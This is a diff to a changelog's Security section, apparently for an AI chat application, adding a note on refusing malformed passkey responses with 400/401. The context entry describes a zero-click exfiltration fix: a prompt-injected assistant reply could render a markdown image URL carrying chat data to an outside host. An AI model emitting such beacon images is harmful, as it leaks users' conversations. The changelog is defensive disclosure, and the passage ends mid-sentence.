@@ -101,6 +101,12 @@
 
 ### Security
 
+- **A malformed passkey response is refused with 400/401, never a server error.** Registering or signing in with a
+  crafted passkey response, for example one whose declared credential ID is longer than the real one, could make the
+  CBOR reader raise an unexpected error and answer `500 Internal server error`. Every malformed registration or login
+  response now gets a clean 400/401 with nothing stored and no session issued, and valid passkeys register and sign in
+  exactly as before. Thanks @ybai08. (#8138, fixes #8126)
+
 - **Remote images in chat no longer load until you click them (zero-click exfiltration fix).** Any assistant-rendered
   `![x](https://host/?d=…)` used to fetch the moment it rendered, which let a prompt-injected reply beacon chat data to
   an outside server. The default CSP `img-src` no longer allows arbitrary `https:` images, and a non-allowlisted remote
